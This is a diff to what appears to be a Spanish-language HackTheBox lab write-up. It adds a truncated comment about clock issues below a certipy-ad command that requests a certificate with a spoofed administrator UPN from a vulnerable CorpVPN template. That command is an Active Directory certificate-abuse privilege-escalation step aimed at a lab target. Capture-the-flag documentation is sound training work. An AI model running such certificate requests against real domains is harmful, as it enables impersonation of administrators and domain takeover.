@@ -296,5 +296,7 @@ verificamos que hemos creado correctamente el usuario y la contraseña
 ### certipy-ad
 ```python
 certipy-ad req -username gamuke$ -password 'gamuke123' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug
+
+# NOTA: si tienes problemas con el reloj ejecutar>
 ```
 ![[Pasted image 20240327011111.png]]
